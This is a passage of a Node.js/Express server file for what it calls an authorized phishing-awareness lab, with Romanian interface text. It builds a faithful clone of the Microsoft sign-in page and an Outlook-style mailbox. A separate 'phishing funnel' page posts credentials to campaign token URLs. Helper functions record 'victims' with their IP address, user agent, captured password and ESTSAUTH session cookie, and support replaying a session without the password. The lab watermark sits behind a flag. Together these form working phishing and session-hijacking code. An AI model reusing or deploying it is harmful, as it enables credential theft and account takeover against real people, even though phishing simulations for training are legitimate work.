  try { res.cookie('cmail_sess', token, { maxAge: 12 * 3600 * 1000, httpOnly: true, sameSite: 'lax', path: '/' }); } catch (e) {}
  if (persistent) {
    try { res.cookie('ESTSAUTHPERSISTENT', token, { maxAge: 7 * 24 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' }); } catch (e) {}
  } else {
    try { res.clearCookie('ESTSAUTHPERSISTENT', { path: '/' }); } catch (e) {}
  }
}

function cmailClearSessCookies(res) {
  try { res.clearCookie('ESTSAUTH', { path: '/' }); } catch (e) {}
  try { res.clearCookie('ESTSAUTHPERSISTENT', { path: '/' }); } catch (e) {}
  try { res.clearCookie('cmail_sess', { path: '/' }); } catch (e) {}
}

function cmailWatermarkHtml() {
  if (!CM_WATERMARK_ON) return '';
  return '<div style="position:fixed;bottom:10px;left:10px;z-index:99999;background:rgba(0,103,184,.1);border:1px solid rgba(0,103,184,.5);color:#0067B8;padding:5px 11px;border-radius:999px;font-size:11px;font-weight:700;letter-spacing:.4px;backdrop-filter:blur(3px)">🔬 LAB • authorized training demo</div>';
}

function cmailCss() {
  return String.raw`
.ms-body{margin:0;background:#fff;color:#000;font-family:'Segoe UI','Segoe UI Web (West European)',Verdana,Arial,sans-serif;font-size:15px;-webkit-font-smoothing:antialiased}
.ms-login-outer{min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:44px 16px 0;box-sizing:border-box}
.ms-logo-wrap{margin-bottom:20px}
.ms-card{width:100%;max-width:440px;background:#fff;border:1px solid rgba(0,0,0,.08);box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px;box-sizing:border-box;min-height:296px;display:flex;flex-direction:column}
.ms-h1{font-size:24px;font-weight:600;margin:14px 0 0;line-height:1.2}
.ms-sub{color:#666;font-size:13px;margin-top:10px;line-height:1.45}
.ms-sub a{color:#0067B8;text-decoration:none}
.ms-err{color:#a4262c;font-size:13px;margin:14px 0 0;line-height:1.45;border-top:1px solid #f0e5e5;padding-top:12px}
.ms-field{margin-top:18px}
.ms-label{display:block;font-size:13px;color:#666;margin-bottom:4px}
.ms-input{display:block;width:100%;box-sizing:border-box;border:none;border-bottom:1px solid #666;padding:5px 0;font-size:15px;font-family:inherit;outline:none;background:transparent}
.ms-input:focus{border-bottom:2px solid #0067B8}
.ms-links{margin-top:18px;font-size:13px;line-height:2}
.ms-links a{color:#0067B8;text-decoration:none}
.ms-links a:hover{text-decoration:underline}
.ms-btn-row{display:flex;justify-content:flex-end;margin-top:28px;flex:none}
.ms-btn{background:#0067B8;color:#fff;border:none;padding:6px 26px;min-width:108px;min-height:32px;font-size:15px;font-family:inherit;cursor:pointer;border-radius:2px}
.ms-btn:hover{background:#005A9E}
.ms-btn:disabled{background:#c8c8c8;cursor:default}
.ms-back-row{height:22px;display:flex;align-items:center}
.ms-back-row a{color:#0067B8;text-decoration:none;font-size:18px;line-height:1}
.ms-foot-full{position:fixed;bottom:0;left:0;right:0;background:#f7f7f7;border-top:1px solid #e6e6e6;padding:12px 24px 12px 270px;font-size:12px;color:#666;display:flex;gap:18px;align-items:center;flex-wrap:wrap;z-index:99}
.ms-foot-full a{color:#0067B8;text-decoration:none}
.ol-body{margin:0;background:#f8f8f8;color:#1a1a1a;font-family:'Segoe UI','Segoe UI Web (West European)',Verdana,Arial,sans-serif;font-size:14px;-webkit-font-smoothing:antialiased}
.ol-header{background:#0078D4;color:#fff;display:flex;align-items:center;gap:14px;padding:0 20px;height:52px;flex-wrap:wrap}
.ol-header a.ol-link{color:#fff;text-decoration:none;font-size:13px}
.ol-header .ol-chip{display:flex;align-items:center;gap:9px;background:rgba(255,255,255,.14);border:1px solid rgba(255,255,255,.35);border-radius:99px;padding:4px 13px 4px 5px}
.ol-main{max-width:1180px;margin:0 auto;padding:20px 20px 90px}
.ol-layout{display:grid;grid-template-columns:190px 1fr 330px;gap:16px;align-items:start}
@media(max-width:1000px){.ol-layout{grid-template-columns:1fr}}
.ol-folders{background:#fff;border:1px solid #e6e6e6;border-radius:4px;padding:10px 0}
.ol-folder{padding:8px 16px;font-size:14px;color:#333;border-left:3px solid transparent}
.ol-folder.active{background:#cfe4f7;font-weight:600;border-left-color:#0078D4;color:#000}
.ol-folder .ol-fcnt{float:right;color:#777;font-size:12px}
.ol-panel{background:#fff;border:1px solid #e6e6e6;border-radius:4px;overflow:hidden}
.ol-panel-h{padding:12px 16px;font-size:13px;font-weight:600;color:#333;border-bottom:1px solid #f0f0f0;display:flex;justify-content:space-between;align-items:center;gap:8px}
.ol-row{display:flex;gap:12px;padding:12px 16px;border-bottom:1px solid #f4f4f4;align-items:flex-start;cursor:default}
.ol-row:hover{background:#f7f9fc}
.ol-row.unread .ol-subj{font-weight:700;color:#1a1a1a}
.ol-av{width:34px;height:34px;border-radius:50%;background:#0078D4;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:600;font-size:13px;flex:none}
.ol-subj{font-size:14px;font-weight:400;color:#333}
.ol-frm{font-size:12px;color:#777;margin-top:1px}
.ol-snip{font-size:13px;color:#777;margin-top:3px;line-height:1.45}
.ol-time{font-size:11px;color:#9a9a9a;white-space:nowrap}
.ol-unread-dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#0078D4;flex:none;margin-top:6px}
.ol-badge{display:inline-block;padding:3px 9px;border-radius:99px;font-size:11px;font-weight:600;letter-spacing:.2px}
.ol-sess-row{border:1px solid #e8e8e8;border-radius:4px;padding:11px 12px;margin:0 12px 10px;background:#fcfcfc}
.ol-sess-tok{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:11px;color:#0067B8;background:#eef4fb;border-radius:4px;padding:2px 7px}
.ol-note{background:#fff8e6;border:1px solid #f0d98c;color:#7a5b00;padding:10px 13px;border-radius:4px;font-size:12.5px;line-height:1.55;margin:0 12px 12px}
.ol-note.red{background:#fdecea;border-color:#f0b3ac;color:#9c2a1e}
.ol-flash{display:flex;gap:10px;align-items:flex-start;padding:12px 16px;border-radius:4px;margin-bottom:16px;font-size:13px;line-height:1.5}
.ol-flash.ok{background:#e9f7ef;border:1px solid #a7dcbf;color:#14663a}
.ol-flash.cm{background:#eaf3fb;border:1px solid #b6d6f2;color:#07538f}
.ol-flash.warn{background:#fff4e0;border:1px solid #f3d395;color:#7a5200}
.ol-meta{font-size:12px;color:#666;line-height:1.7}
.ol-btn{display:inline-block;background:#0067B8;color:#fff;border:none;padding:8px 20px;border-radius:4px;font-size:14px;font-family:inherit;cursor:pointer;text-decoration:none}
.ol-btn:hover{background:#005A9E}
.ol-btn-ghost{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.6);padding:6px 12px;border-radius:4px;font-size:13px;font-family:inherit;cursor:pointer}
.ol-btn-ghost:hover{background:rgba(255,255,255,.15)}
.ol-compose-field{margin-bottom:16px}
.ol-compose-input{width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #c8c8c8;border-radius:4px;font-size:14px;font-family:inherit;outline:none;background:#fff}
.ol-compose-input:focus{border-color:#0067B8}
textarea.ol-compose-input{min-height:170px;resize:vertical;line-height:1.6}
.ol-back{color:#0067B8;font-size:13px;text-decoration:none}
`.trim();
}

// Shared top bar for the (authenticated) Outlook-style mailbox pages.
function cmailTop(acc, extra) {
  const initial = esc(String(acc.display_name || acc.email || '?').trim().charAt(0).toUpperCase() || 'O');
  return `<div class="ol-header">
    <div style="display:flex;align-items:center;gap:10px;flex:none">
      ${msLogoSvg(86)}
      <span style="font-size:17px;font-weight:600;color:#fff;margin-left:8px;letter-spacing:.2px">Mail</span>
    </div>
    <div style="flex:1"></div>
    ${extra || ''}
    <a class="ol-link" href="/cmail/compose" style="padding:7px 14px;border:1px solid rgba(255,255,255,.75);border-radius:4px;background:rgba(255,255,255,.12)">✍️ Compune</a>
    <div class="ol-chip">
      <div class="ol-av" style="width:26px;height:26px;font-size:11px;background:${esc(acc.avatar_color || '#0078D4')}">${initial}</div>
      <span style="font-size:13px;color:#fff">${esc(acc.display_name || acc.email)}</span>
    </div>
    <form method="POST" action="/cmail/logout" style="margin:0"><button type="submit" class="ol-btn-ghost">Sign out</button></form>
  </div>`;
}

// The "real" Microsoft-style sign-in page (lab). opts: {step, email, error}
// Step 1 = "Email, phone, or Skype" · Step 2 = "Enter password".
function cmailLoginPage(opts) {
  opts = opts || {};
  const step = opts.step === 2 ? 2 : 1;
  const email = String(opts.email || '');
  const error = opts.error ? `<div class="ms-err" role="alert">${esc(opts.error)}</div>` : '';
  let body;
  if (step === 1) {
    body = `<form method="POST" action="/cmail/login">
        <h1 class="ms-h1">Sign in</h1>
        <div class="ms-sub">Microsoft 365 (Demo) — conturi de laborator hotmail/outlook create de echipă</div>
        ${error}
        <div class="ms-field">
          <label class="ms-label" for="ms-em">Email, phone, or Skype</label>
          <input class="ms-input" type="email" id="ms-em" name="email" value="${esc(email)}" placeholder="Email, phone, or Skype" required autofocus autocomplete="username">
        </div>
        <div class="ms-links">
          <a href="#" onclick="return false">No account? Create one!</a><br>
          <a href="#" onclick="return false">Sign in options</a>
        </div>
        <div class="ms-btn-row"><button type="submit" class="ms-btn">Next</button></div>
      </form>`;
  } else {
    body = `<form method="POST" action="/cmail/login">
        <div class="ms-back-row"><a href="/cmail/login" aria-label="Back to account selection">←</a></div>
        <h1 class="ms-h1">Enter password</h1>
        <div class="ms-sub">${esc(email)}<br><a href="/cmail/login">Sign in with a different account</a></div>
        ${error}
        <input type="hidden" name="email" value="${esc(email)}">
        <div class="ms-field">
          <label class="ms-label" for="ms-pw">Password</label>
          <input class="ms-input" type="password" id="ms-pw" name="password" placeholder="Password" required autofocus autocomplete="current-password">
        </div>
        <div class="ms-links"><a href="#" onclick="return false">Forgot password?</a></div>
        <div class="ms-btn-row"><button type="submit" class="ms-btn">Sign in</button></div>
      </form>`;
  }
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>Sign in to your account</title><style>${cmailCss()}</style></head><body class="ms-body">
  <div class="ms-login-outer">
    <div class="ms-logo-wrap">${msLogoSvg(108)}</div>
    <div class="ms-card">${body}</div>
    <div style="height:60px"></div>
  </div>
  <div class="ms-foot-full"><span>© 2026 Microsoft</span><a href="#" onclick="return false">Privacy &amp; cookies</a><a href="#" onclick="return false">Terms of use</a><span style="flex:1"></span>${cmailWatermarkHtml()}</div>
  </body></html>`;
}

// The phishing funnel page — the same Microsoft sign-in look, but the form
// posts to the campaign token URL instead of /cmail/login.
// opts: {step, campaign, email, error}
function cmailPhishPage(opts) {
  opts = opts || {};
  const camp = opts.campaign || { token: '' };
  const step = opts.step === 2 ? 2 : 1;
  const email = String(opts.email || '');
  const error = opts.error ? `<div class="ms-err" role="alert">${esc(opts.error)}</div>` : '';
  const action = '/cmlogin/' + esc(camp.token);
  let body;
  if (step === 1) {
    body = `<form method="POST" action="${action}" data-testid="m365-phish-step1">
        <h1 class="ms-h1">Sign in</h1>
        ${error}
        <div class="ms-field">
          <label class="ms-label" for="mp-em">Email, phone, or Skype</label>
          <input class="ms-input" type="email" id="mp-em" name="email" value="${esc(email)}" placeholder="Email, phone, or Skype" required autofocus autocomplete="username">
        </div>
        <div class="ms-links">
          <a href="#" onclick="return false">No account? Create one!</a><br>
          <a href="#" onclick="return false">Sign in options</a>
        </div>
        <div class="ms-btn-row"><button type="submit" class="ms-btn">Next</button></div>
      </form>`;
  } else {
    body = `<form method="POST" action="${action}" data-testid="m365-phish-step2">
        <div class="ms-back-row"><a href="${action}" aria-label="Back to account selection">←</a></div>
        <h1 class="ms-h1">Enter password</h1>
        <div class="ms-sub">${esc(email)}<br><a href="${action}">Sign in with a different account</a></div>
        ${error}
        <input type="hidden" name="email" value="${esc(email)}">
        <div class="ms-field">
          <label class="ms-label" for="mp-pw">Password</label>
          <input class="ms-input" type="password" id="mp-pw" name="password" placeholder="Password" required autofocus autocomplete="current-password">
        </div>
        <div class="ms-links"><a href="#" onclick="return false">Forgot password?</a></div>
        <div class="ms-btn-row"><button type="submit" class="ms-btn">Sign in</button></div>
      </form>`;
  }
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>Sign in to your account</title><style>${cmailCss()}</style></head><body class="ms-body">
  <div class="ms-login-outer">
    <div class="ms-logo-wrap">${msLogoSvg(108)}</div>
    <div class="ms-card">${body}</div>
    <div style="height:60px"></div>
  </div>
  <div class="ms-foot-full"><span>© 2026 Microsoft</span><a href="#" onclick="return false">Privacy &amp; cookies</a><a href="#" onclick="return false">Terms of use</a><span style="flex:1"></span>${cmailWatermarkHtml()}</div>
  </body></html>`;
}

function cmailMissingPage(msg) {
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>Sign in to your account</title><style>${cmailCss()}</style></head><body class="ms-body">
  <div class="ms-login-outer">
    <div class="ms-logo-wrap">${msLogoSvg(108)}</div>
    <div class="ms-card" style="text-align:center">
      <div style="font-size:34px;margin-bottom:6px">🔒</div>
      <h1 class="ms-h1" style="font-size:19px">We couldn't sign you in</h1>
      <p style="color:#666;font-size:13px;line-height:1.6;margin-top:10px">${esc(msg)}</p>
      <div style="height:12px"></div>
      <a class="ol-btn" style="display:inline-block" href="/cmail/login">Back to sign in</a>
    </div>
    <div style="height:60px"></div>
  </div>
  <div class="ms-foot-full"><span>© 2026 Microsoft</span><span style="flex:1"></span>${cmailWatermarkHtml()}</div>
  </body></html>`;
}

function cmailStageBadge(stage) {
  const map = {
    'visit': { t: 'Vizită', c: 'background:#e8f0fe;color:#1a5fb4;border:1px solid #c3d7f5' },
    'email_entered': { t: 'E-mail introdus', c: 'background:#fdf6e3;color:#8a6d1a;border:1px solid #efe0ae' },
    'creds_failed': { t: 'Parolă greșită', c: 'background:#fff1e0;color:#9c4a00;border:1px solid #f3d4a5' },
    'creds_captured': { t: 'Credențiale capturate', c: 'background:#fdeaea;color:#a0291d;border:1px solid #f3bdb6' },
    'session_captured': { t: 'Sesiune capturată', c: 'background:#eaf3fb;color:#0067B8;border:1px solid #b6d6f2' },
    'session_revoked': { t: 'Sesiune revocată', c: 'background:#eef0f4;color:#5a5f73;border:1px solid #d8dce4' }
  };
  const m = map[stage] || { t: esc(stage || '—'), c: 'background:#eef0f4;color:#5a5f73;border:1px solid #d8dce4' };
  return `<span class="ol-badge" style="${m.c}">${m.t}</span>`;
}

function cmailSeedMessages(accountId) {
  const seed = [
    { from_name: 'Microsoft account team', from_email: 'accountsecurity-noreply@microsoft.com', subject: 'Welcome to your demo Microsoft account', body: 'Welcome! Acesta este un cont de e-mail DEMO de laborator, creat doar pentru antrenamente de securitate (phishing awareness).\n\nPoți folosi adresa ta pentru a testa fluxul complet: autentificare Microsoft, funnel de phishing, capturare de sesiune și replay.\n\n— Echipa lab MarketForge' },
    { from_name: 'Microsoft account security', from_email: 'account-security@microsoft.com', subject: 'Review your recent sign-in activity', body: 'Am detectat o conectare dintr-o locație nouă pentru contul tău de laborator.\n\nDeschide panoul „Sesiuni active” din dreapta și verifică dispozitivele conectate. Dacă nu recunoști o sesiune, revoc-o imediat din MarketForge → Microsoft 365 (Demo) → Capturi.' },
    { from_name: 'Contoso Travel', from_email: 'reservations@contoso.com', subject: 'Booking confirmation — test journey', body: 'Salut, rezervarea ta de test este confirmată.\n\nAcest mesaj face parte din campania demo de conștientizare a phishing-ului. Nicio rezervare reală nu a fost făcută.' }
  ];
  const ins = db.prepare('INSERT INTO cmail_messages (account_id, from_name, from_email, subject, body, is_read) VALUES (?,?,?,?,?,0)');
  for (const m of seed) ins.run(accountId, m.from_name, m.from_email, m.subject, m.body);
}

// Active/full capture info attached to a cmail victim row (parsed from data_json history).
function cmailCaptureInfo(v) {
  const out = { session: null, password: null, capturedAt: null, campaignId: null, email: v && v.email ? v.email : null };
  try {
    const raw = v && v.data_json;
    if (!raw) return out;
    const p = JSON.parse(raw);
    if (Array.isArray(p)) {
      for (const e of p) {
        if (!e || typeof e !== 'object') continue;
        if (e.event === 'session_captured') {
          out.session = e.cmail_sess || null;
          out.password = e.password || e.password_attempt || null;
          out.capturedAt = e.captured_at || null;
          out.campaignId = e.campaign || null;
          out.email = e.email || out.email;
        } else if (!out.password && e.password_attempt) {
          out.password = e.password_attempt;
        }
      }
    }
  } catch (e) {}
  return out;
}

function cmailGetCampaign(token) {
  return db.prepare(
    `SELECT c.id as id, c.user_id as user_id, c.account_id as account_id, c.token as token, c.created_at as created_at,
            a.email as email, a.display_name as display_name, a.avatar_color as avatar_color, a.password_hash as password_hash
     FROM cmail_campaigns c JOIN cmail_accounts a ON a.id = c.account_id
     WHERE c.token = ?`
  ).get(token) || null;
}

// Find-or-create the victim "visit" row for a funnel hit and return it.
// Reuses the cm_vid cookie ONLY while the victim is still in the early stages
// (visit / email_entered) so a stale cookie can never leak a previous campaign.
// Returns the victim row object.
function cmailVictimFor(campaign, req, res) {
  const cookies = cmailCookies(req);
  let victim = null;
  if (cookies.cm_vid) {
    const row = db.prepare('SELECT * FROM victims WHERE id = ?').get(cookies.cm_vid) || null;
    if (row) {
      const earlyStage = row.stage === 'visit' || row.stage === 'email_entered';
      // A creds_failed victim is reused ONLY when the attempt belongs to the
      // same campaign, so a stale cm_vid cookie can never leak across campaigns.
      let sameCamp = false;
      if (row.stage === 'creds_failed') {
        try {
          const p = JSON.parse(row.data_json || '[]');
          if (Array.isArray(p)) {
            const last = p[p.length - 1];
            sameCamp = !!(last && last.campaign === campaign.id);
          }
        } catch (e) {}
      }
      if (earlyStage || sameCamp) victim = row;
    }
  }
  if (!victim) {
    const r = db.prepare(
      "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (NULL, ?, 'cmail', ?, ?, 'visit')"
    ).run(campaign.user_id, req.ip || '', String(req.headers['user-agent'] || '').substring(0, 500));
    victim = { id: r.lastInsertRowid, stage: 'visit', user_id: campaign.user_id };
    try { res.cookie('cm_vid', String(victim.id), { maxAge: 12 * 3600 * 1000, httpOnly: false, sameSite: 'lax', path: '/' }); } catch (e) {}
    try { io.emit('victim_update', { id: victim.id, stage: 'visit', marketplace: 'cmail', userId: campaign.user_id }); } catch (e) {}
    db.prepare('UPDATE victims SET ip_address = ?, user_agent = ? WHERE id = ?').run(req.ip || '', String(req.headers['user-agent'] || '').substring(0, 500), victim.id);
  }
  return victim;
}

// Active phish-origin session (if any) for an account.
function cmailPhishSessionFor(accountId) {
  return db.prepare(
    `SELECT * FROM cmail_sessions WHERE account_id = ? AND origin = 'phish' AND revoked = 0 AND expires_at > datetime('now') ORDER BY created_at DESC LIMIT 1`
  ).get(accountId) || null;
}

function cmailPushCaptureEvent(victimId, entry) {
  let hist = [];
  try {
    const cur = db.prepare('SELECT data_json FROM victims WHERE id = ?').get(victimId);
    if (cur && cur.data_json) {
      const p = JSON.parse(cur.data_json);
      if (Array.isArray(p)) hist = p;
    }
  } catch (e) {}
  hist.push(entry);
  db.prepare('UPDATE victims SET data_json = ? WHERE id = ?').run(JSON.stringify(hist), victimId);
}

// Active-sessions education panel inside the mailbox.
function cmailSessionsHtml(accountId, currentToken) {
  const rows = db.prepare('SELECT * FROM cmail_sessions WHERE account_id = ? ORDER BY created_at DESC').all(accountId);
  if (!rows.length) return '<div style="padding:16px;color:#777;font-size:13px">Nicio sesiune activă pe acest cont.</div>';
  return rows.map(function (s) {
    const exp = new Date(String(s.expires_at || '').replace(' ', 'T'));
    const active = !s.revoked && exp.getTime() > Date.now();
    const isCur = s.token === currentToken;
    const rev = s.revoked ? '<span class="ol-badge" style="background:#f0f0f4;color:#7a7f93;border:1px solid #d8dce4">Revocată</span>' : '';
    let badge;
    if (s.origin === CM_PHISH_ORIGIN) {
      badge = '<span class="ol-badge" style="background:#fdecf5;color:#b02a6a;border:1px solid #f3b9d4">🎣 Funnel (capturat)</span>';
    } else {
      badge = '<span class="ol-badge" style="background:#e9f7ef;color:#14663a;border:1px solid #a7dcbf">✔ Aplicație (oficială)</span>';
    }
    const masked = esc(String(s.token).substring(0, 10) + '…' + String(s.token).slice(-6));
    const status = active ? '' : (s.revoked ? '' : '<span class="ol-badge" style="background:#eef0f4;color:#5a5f73;border:1px solid #d8dce4">Expirată</span>');
    return `<div class="ol-sess-row">
      <div style="display:flex;justify-content:space-between;align-items:center;gap:8px;flex-wrap:wrap">
        <span style="font-weight:600;font-size:12.5px;color:#333">${isCur ? '🔑 Sesiunea curentă · ' : ''}<span class="ol-sess-tok">${masked}</span></span>
        ${badge} ${rev} ${status}
      </div>
      <div class="ol-meta" style="margin-top:6px">
        IP: <b>${esc(String(s.ip_address || '—'))}</b> · UA: ${esc(String(s.user_agent || '—').substring(0, 55))}${(s.user_agent || '').length > 55 ? '…' : ''}<br>
        Creat: ${esc(String(s.created_at || '—').substring(0, 16))} · Expiră: ${esc(String(s.expires_at || '—').substring(0, 16))}
      </div>
    </div>`;
  }).join('');
}

// The (authenticated) Outlook-style mailbox page: folder rail + inbox + active
// sessions education panel.
function cmailAppPage(req, flash) {
  const acc = req.cmailAccount;
  const sess = req.cmailSession;
  const msgs = db.prepare('SELECT * FROM cmail_messages WHERE account_id = ? ORDER BY created_at DESC, id DESC').all(acc.id);
  const rows = db.prepare('SELECT * FROM cmail_sessions WHERE account_id = ? ORDER BY created_at DESC').all(acc.id);
  const unread = msgs.filter(function (m) { return !m.is_read; }).length;
  const phishActive = rows.some(function (r) { return r.origin === CM_PHISH_ORIGIN && !r.revoked && new Date(String(r.expires_at).replace(' ', 'T')).getTime() > Date.now(); });
  let flashHtml = '';
  if (flash) {
    if (flash.capture) flashHtml = `<div class="ol-flash cm">🎣 <div><b>Sesiune capturată (demo).</b> Pagina falsă a reținut parola și cookie-ul de sesiune (<code>ESTSAUTH</code>) al acestui cont — exact ce ar face un proxy MITM real. Detaliile sunt în MarketForge → Microsoft 365 (Demo) → Capturi.</div></div>`;
    if (flash.capture_already) flashHtml = `<div class="ol-flash cm">🎣 <div><b>Captură deja efectuată.</b> Acest cont avea deja o sesiune capturată activă — ai fost redirecționat în cutia poștală folosind cookie-ul furat (fără parolă).</div></div>`;
    if (flash.replay) flashHtml = `<div class="ol-flash warn">🕹 <div><b>Replay (operator).</b> Te-ai conectat în cutia poștală folosind <b>doar cookie-ul de sesiune capturat</b> (<code>ESTSAUTH</code>) — fără parolă. Asta este esența deturnării de sesiune.</div></div>`;
    if (flash.sent) flashHtml = `<div class="ol-flash ok">✓ <div>Mesaj trimis (demo). Am pus o copie în cutia poștală pentru evidență.</div></div>`;
  }
  const warn = phishActive
    ? `<div class="ol-note red"><b>⚠ Sesiune capturată detectată.</b> Acest cont are o sesiune de pe un funnel de test (🎣). În lumea reală, atacatorul s-ar putea conecta acum fără parolă. Revocă sesiunea din <b>MarketForge → Microsoft 365 (Demo) → Capturi → Revocă</b>.</div>`
    : `<div class="ol-note">💡 <b>Panou educațional:</b> fiecare sesiune listată aici poate fi folosită pentru autentificare prin simpla reutilizare a cookie-ului (ESTSAUTH). O sesiune <b>🎣 capturată</b> înseamnă că atacatorul o poate „reda” (replay) fără să cunoască parola.</div>`;
  const inboxRows = msgs.map(function (m) {
    const mUnread = !m.is_read;
    const initial = esc(String(m.from_name || m.from_email || '?').trim().charAt(0).toUpperCase() || '?');
    const time = esc(String(m.created_at || '').substring(5, 16));
    return `<div class="ol-row${mUnread ? ' unread' : ''}">
      ${mUnread ? '<span class="ol-unread-dot"></span>' : ''}
      <div class="ol-av" style="width:32px;height:32px;font-size:12px;margin-top:1px">${initial}</div>
      <div style="flex:1;min-width:0">
        <div style="display:flex;gap:10px;align-items:baseline">
          <span class="ol-subj">${esc(m.from_name || m.from_email)}</span>
          <span class="ol-time">${time}</span>
        </div>
        <div class="ol-frm">${esc(m.from_email || '')}</div>
        <div class="ol-snip"><b style="color:#1a1a1a;font-weight:600">${esc(m.subject || '')}</b> — ${esc(m.body || '')}</div>
      </div>
    </div>`;
  }).join('') || '<div style="padding:22px;color:#777;font-size:13px;text-align:center">Cutia poștală este goală.</div>';

  const content = `${cmailTop(acc, '')}
  <div class="ol-main">
    ${flashHtml}
    <div class="ol-layout">
      <div class="ol-folders">
        <div class="ol-folder active">📥 Inbox <span class="ol-fcnt">${unread}</span></div>
        <div class="ol-folder">📤 Sent</div>
        <div class="ol-folder">🗑 Drafts</div>
        <div class="ol-folder">📁 Archive</div>
      </div>
      <div class="ol-panel">
        <div class="ol-panel-h">Inbox <span class="ol-meta">${unread} necitite</span></div>
        ${inboxRows}
      </div>
      <div>
        <div class="ol-panel" style="margin-bottom:16px">
          <div class="ol-panel-h">🔐 Sesiuni active <span class="ol-meta">${rows.length}</span></div>
          <div style="padding-top:12px">${cmailSessionsHtml(acc.id, sess.token)}</div>
          <div style="padding:0 12px 12px;margin-top:2px">${warn}</div>
        </div>
      </div>
    </div>
  </div>`;
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>Inbox — ${esc(acc.display_name || acc.email)} | Microsoft 365 (Demo)</title><style>${cmailCss()}</style></head><body class="ol-body">${content}${cmailWatermarkHtml()}</body></html>`;
}

function cmailComposePage(req, error) {
  const acc = req.cmailAccount;
  const err = error ? `<div class="ol-flash warn" style="margin-bottom:14px">✋ ${esc(error)}</div>` : '';
  const content = `${cmailTop(acc, '<a class="ol-back" href="/cmail">← Înapoi la Inbox</a>')}
  <div class="ol-main" style="max-width:820px">
    ${err}
    <div class="ol-panel">
      <div class="ol-panel-h">✍️ Mesaj nou</div>
      <div style="padding:20px 22px">
        <form method="POST" action="/cmail/send">
          <div class="ol-compose-field"><label class="ol-meta" for="cm-to" style="display:block;margin-bottom:4px">To</label><input class="ol-compose-input" type="email" id="cm-to" name="to" placeholder="recipient@example.com" required></div>
          <div class="ol-compose-field"><label class="ol-meta" for="cm-sub" style="display:block;margin-bottom:4px">Add a subject</label><input class="ol-compose-input" type="text" id="cm-sub" name="subject" placeholder="Add a subject" maxlength="160" required></div>
          <div class="ol-compose-field"><textarea class="ol-compose-input" id="cm-body" name="body" placeholder="Message"></textarea></div>
          <div style="display:flex;gap:10px;align-items:center">
            <button type="submit" class="ol-btn">Trimite</button>
            <a href="/cmail" class="ol-back">Discard</a>
            <span class="ol-meta">Demo de laborator — mesajul este reținut doar în această cutie poștală.</span>
          </div>
        </form>
      </div>
    </div>
  </div>`;
  return `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><meta name="robots" content="noindex,nofollow"><title>Mesaj nou | Microsoft 365 (Demo)</title><style>${cmailCss()}</style></head><body class="ol-body" style="background:#f8f8f8">${content}${cmailWatermarkHtml()}</body></html>`;
}

// APP ROUTES — the "real" Microsoft-style lab sign-in + Outlook mailbox
// ============================================================================
app.get('/cmail/login', (req, res) => {
  res.send(cmailLoginPage({ step: 1, email: '', error: null }));
});

app.post('/cmail/login', (req, res) => {
  const email = String(req.body.email || '').trim().toLowerCase();
  const password = String(req.body.password || '');
  if (!email) return res.send(cmailLoginPage({ step: 1, email: '', error: 'Enter a valid email address, phone number, or Skype name.' }));
  if (!password) return res.send(cmailLoginPage({ step: 2, email: email, error: null }));
  const acc = db.prepare('SELECT * FROM cmail_accounts WHERE LOWER(email) = ?').get(email);
  if (!acc) {
    return res.send(cmailLoginPage({ step: 2, email: email, error: "That Microsoft account doesn't exist. Enter a different account or get a new one." }));
  }
  if (!bcrypt.compareSync(password, acc.password_hash)) {
    return res.send(cmailLoginPage({ step: 2, email: email, error: "Your account or password is incorrect. If you can't remember your password, reset it now." }));
  }
  const token = cmailToken();
  db.prepare(`INSERT INTO cmail_sessions (account_id, token, origin, user_agent, ip_address, expires_at)
    VALUES (?, ?, ?, ?, ?, datetime('now', '+12 hours'))`)
    .run(acc.id, token, CM_APP_ORIGIN, String(req.headers['user-agent'] || '').substring(0, 500), req.ip || '');
  cmailSetSessCookies(res, token, false);
  res.redirect('/cmail');
});

app.get('/cmail', cmailAuth, (req, res) => {
  db.prepare('UPDATE cmail_messages SET is_read = 1 WHERE account_id = ? AND is_read = 0').run(req.cmailAccount.id);
  const flash = {
    capture: !!req.query.capture,
    capture_already: !!req.query.capture_already,
    replay: !!req.query.replay,
    sent: !!req.query.sent
  };
  res.send(cmailAppPage(req, flash));
});

app.post('/cmail/logout', cmailAuth, (req, res) => {
  try {
    db.prepare('UPDATE cmail_sessions SET revoked = 1 WHERE token = ?').run(req.cmailSession.token);
  } catch (e) {}
  cmailClearSessCookies(res);
  res.redirect('/cmail/login');
});

app.get('/cmail/compose', cmailAuth, (req, res) => {
  res.send(cmailComposePage(req, null));
});

app.post('/cmail/send', cmailAuth, (req, res) => {
  const acc = req.cmailAccount;
  const to = String(req.body.to || '').trim();
  const subject = String(req.body.subject || '').trim();
  const body = String(req.body.body || '').trim();
  if (!to || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(to)) return res.send(cmailComposePage(req, 'The recipient address is not valid.'));
  if (!subject) return res.send(cmailComposePage(req, 'Add a subject for the message.'));
  db.prepare('INSERT INTO cmail_messages (account_id, from_name, from_email, subject, body, is_read) VALUES (?,?,?,?,?,1)')
    .run(acc.id, acc.display_name || acc.email, acc.email, 'Copy sent: ' + subject,
      'To: ' + to + '\n\n' + body);
  try {
    db.prepare("INSERT INTO logs (user_id, action, details, ip_address) VALUES (?, 'cmail_send', ?, ?)")
      .run(req.cmailSession.owner_id, 'MS365: message sent from ' + acc.email + ' to ' + to, req.ip || '');
  } catch (e) {}
